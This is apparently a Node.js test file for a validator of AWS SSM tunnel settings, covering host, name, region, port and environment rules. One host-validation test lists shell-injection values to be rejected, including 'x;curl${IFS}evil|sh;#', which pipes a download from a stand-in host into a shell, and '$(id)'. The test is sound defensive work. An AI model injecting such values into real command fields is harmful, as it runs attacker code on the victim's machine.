const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const { inferEnv, normalizeTunnel, validateTunnel, ENVS, REGION_RE, STABLE_MS, FAILING, AWS_REGIONS } = require('../lib/validate');

test('AWS_REGIONS lists every commercial region once, each a valid region name', () => {
  assert.ok(AWS_REGIONS.length >= 30, `only ${AWS_REGIONS.length} regions`);
  assert.strictEqual(new Set(AWS_REGIONS).size, AWS_REGIONS.length);
  for (const r of AWS_REGIONS) assert.ok(REGION_RE.test(r), r);
  for (const r of ['us-east-1', 'us-west-2', 'eu-west-1', 'eu-central-1', 'ap-southeast-1', 'ap-south-1', 'sa-east-1', 'ca-central-1']) {
    assert.ok(AWS_REGIONS.includes(r), r);
  }
  assert.strictEqual(AWS_REGIONS[0], 'us-east-1', 'AWS default region first');
});

test('#10 shared rules have one home and the renderer helpers use it', () => {
  assert.strictEqual(STABLE_MS, 10000);
  assert.deepStrictEqual([...FAILING], ['failed', 'reconnecting']);
  assert.ok(REGION_RE.test('us-west-2') && !REGION_RE.test('r'));
  const L = require('../renderer/logic');
  const now = 1e9;
  assert.strictEqual(L.stableActive({ state: 'active', since: now - STABLE_MS }, now), true);
  assert.strictEqual(L.stableActive({ state: 'active', since: now - STABLE_MS + 1 }, now), false);
  for (const state of ['failed', 'reconnecting', 'active', 'idle']) {
    assert.strictEqual(L.failing({ state }), FAILING.has(state), state);
  }
});

const good = (over = {}) => ({
  name: 'onyx-prod', region: 'us-west-2', target: 'i-0357e26df0d26b2ae',
  host: 'db.example.com', port: 5432, local: 15002, desc: 'x', env: 'production', auto: false, ...over,
});

const HOST_MSG = 'Host may only contain letters, digits, . _ : -';

test('host accepts DNS names, IPv4 and bare IPv6', () => {
  for (const host of [
    'db.example.com',
    'mydb.cluster-abc123xyz.us-west-2.rds.amazonaws.com',
    'master.glacier-jobs.28i723.usw2.cache.amazonaws.com',
    'my_host',
    '10.0.12.34',
    '::1',
    'fe80::1',
    '2001:db8::8a2e:370:7334',
  ]) {
    assert.strictEqual(validateTunnel(good({ host }), []).errors.host, undefined, host);
  }
});

test('host rejects shell metacharacters and other characters outside [A-Za-z0-9._:-]', () => {
  for (const host of [
    'x;curl${IFS}evil|sh;#',
    'a;b', 'a|b', 'a&b', 'a$b', 'a`b`', '$(id)', 'a\'b', 'a"b', 'a\\b', 'a/b', 'a*b', 'a(b)', 'a<b', 'a>b', 'a!b', 'a#b', 'a=b', 'a%b', 'a@b', 'a[b]', 'a{b}', 'a~b',
    'a\nb', 'a\tb', 'a b', 'a,b', 'hôst',
  ]) {
    assert.strictEqual(validateTunnel(good({ host }), []).errors.host, HOST_MSG, JSON.stringify(host));
  }
  assert.strictEqual(validateTunnel(good({ host: '' }), []).errors.host, 'Required');
});

test('ENVS lists the three canonical environments', () => {
  assert.deepStrictEqual(ENVS, ['production', 'staging', 'other']);
});

test('inferEnv checks staging first', () => {
  assert.strictEqual(inferEnv('onyx-stg'), 'staging');
  assert.strictEqual(inferEnv('glacier-stg-redis'), 'staging');
  assert.strictEqual(inferEnv('prod-staging-db'), 'staging');
  assert.strictEqual(inferEnv('onyx-prod'), 'production');
  // Only -prod/-stg style names are guessed; anything else is left for the user to classify.
  assert.strictEqual(inferEnv('glacier-cache'), 'other');
  assert.strictEqual(inferEnv('glacier-jobs-redis'), 'other');
  assert.strictEqual(inferEnv('kelp-1'), 'other');
});

test('normalizeTunnel trims strings, converts numbers and defaults desc/auto', () => {
  const n = normalizeTunnel({ name: ' a ', region: ' r ', target: ' t ', host: ' h ', port: '5432', local: ' 15002 ', env: 'staging', auto: 1 });
  assert.deepStrictEqual(n, { name: 'a', region: 'r', target: 't', host: 'h', port: 5432, local: 15002, desc: '', env: 'staging', auto: true, profile: '' });
});

test('a valid tunnel has no errors and no clashes', () => {
  assert.deepStrictEqual(validateTunnel(good(), []), { errors: {}, clashes: [] });
});

test('accepts numeric strings for ports', () => {
  assert.deepStrictEqual(validateTunnel(good({ port: '5432', local: '15002' }), []).errors, {});
});

test('name rules', () => {
  assert.strictEqual(validateTunnel(good({ name: '' }), []).errors.name, 'Required');
  assert.strictEqual(validateTunnel(good({ name: '   ' }), []).errors.name, 'Required');
  assert.strictEqual(validateTunnel(good({ name: 'Bad Name' }), []).errors.name, 'Use lowercase letters, digits, - . _');
  assert.strictEqual(validateTunnel(good({ name: '-x' }), []).errors.name, 'Use lowercase letters, digits, - . _');
  assert.strictEqual(validateTunnel(good({ name: 'a'.repeat(65) }), []).errors.name, 'Use lowercase letters, digits, - . _');
  assert.strictEqual(validateTunnel(good({ name: 'a'.repeat(64) }), []).errors.name, undefined);
});

test('duplicate names are errors, with an archived suffix when relevant', () => {
  const others = [good({ name: 'a', archived: false }), good({ name: 'b', archived: true })];
  assert.strictEqual(validateTunnel(good({ name: 'a' }), others).errors.name, '“a” already exists');
  assert.strictEqual(validateTunnel(good({ name: 'b' }), others).errors.name, '“b” already exists (archived)');
  assert.strictEqual(validateTunnel(good({ name: 'c' }), others).errors.name, undefined);
});

test('region, target, host messages', () => {
  const e = validateTunnel(good({ region: 'nope', target: 'i-xyz', host: '' }), []).errors;
  assert.strictEqual(e.region, 'Expected an AWS region like us-east-1');
  assert.strictEqual(e.target, 'Expected an EC2 instance ID like i-0357e26df0d26b2ae');
  assert.strictEqual(e.host, 'Required');
  assert.strictEqual(validateTunnel(good({ host: 'a b' }), []).errors.host, HOST_MSG);
  assert.strictEqual(validateTunnel(good({ host: 'a,b' }), []).errors.host, HOST_MSG);
});

test('port and local must be integers 1..65535', () => {
  for (const bad of [0, 65536, 1.5, 'abc', '', null, -1]) {
    const e = validateTunnel(good({ port: bad, local: bad }), []).errors;
    assert.strictEqual(e.port, 'Enter a port from 1 to 65535', String(bad));
    assert.strictEqual(e.local, 'Enter a port from 1 to 65535', String(bad));
  }
  assert.deepStrictEqual(validateTunnel(good({ port: 1, local: 65535 }), []).errors, {});
});

test('env must be one of ENVS', () => {
  assert.strictEqual(validateTunnel(good({ env: 'prod' }), []).errors.env, 'Pick an environment');
  assert.strictEqual(validateTunnel(good({ env: undefined }), []).errors.env, 'Pick an environment');
});

test('local-port clashes list non-archived others only and never add an error', () => {
  const others = [
    good({ name: 'one', local: 443, auto: true }),
    good({ name: 'two', local: 443, archived: true }),
    good({ name: 'three', local: 80 }),
  ];
  const r = validateTunnel(good({ name: 'new', local: 443 }), others);
  assert.deepStrictEqual(r.clashes, [{ name: 'one', auto: true }]);
  assert.deepStrictEqual(r.errors, {});
});

test('works as a browser global when loaded without module (self.SSMValidate)', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'lib', 'validate.js'), 'utf8');
  const self = {};
  vm.runInNewContext(src, { self });
  assert.strictEqual(typeof self.SSMValidate.validateTunnel, 'function');
  assert.strictEqual(typeof self.SSMValidate.inferEnv, 'function');
  assert.strictEqual(self.SSMValidate.inferEnv('x-stg'), 'staging');
  // objects built inside the vm have another realm's prototypes, so compare as JSON
  assert.strictEqual(JSON.stringify(self.SSMValidate.validateTunnel(good(), []).errors), '{}');
});

test('validateTunnel rejects the reserved CLI keyword "all"', () => {
  const r = validateTunnel(good({ name: 'all' }), []);
  assert.match(r.errors.name, /reserved/i);
  assert.deepStrictEqual(validateTunnel(good({ name: 'all-prod' }), []).errors, {});
});
